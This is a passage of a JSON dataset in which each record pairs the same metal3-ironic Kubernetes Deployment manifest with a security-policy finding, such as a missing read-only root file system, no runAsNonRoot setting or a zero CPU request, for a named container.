    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ironic-httpd\" does not have a read-only root file system"
  },
  {
    "id": "7591",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ironic-inspector\" does not have a read-only root file system"
  },
  {
    "id": "7592",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ironic-ipa-downloader\" does not have a read-only root file system"
  },
  {
    "id": "7593",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mariadb\" does not have a read-only root file system"
  },
  {
    "id": "7594",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ironic\" is not set to runAsNonRoot"
  },
  {
    "id": "7595",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ironic-dnsmasq\" is not set to runAsNonRoot"
  },
  {
    "id": "7596",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ironic-httpd\" is not set to runAsNonRoot"
  },
  {
    "id": "7597",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ironic-inspector\" is not set to runAsNonRoot"
  },
  {
    "id": "7598",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ironic-ipa-downloader\" is not set to runAsNonRoot"
  },
  {
    "id": "7599",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mariadb\" is not set to runAsNonRoot"
  },
  {
    "id": "7600",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ironic\" has cpu request 0"
  },
  {
    "id": "7601",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ironic-dnsmasq\" has cpu request 0"
  },
  {
    "id": "7602",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - 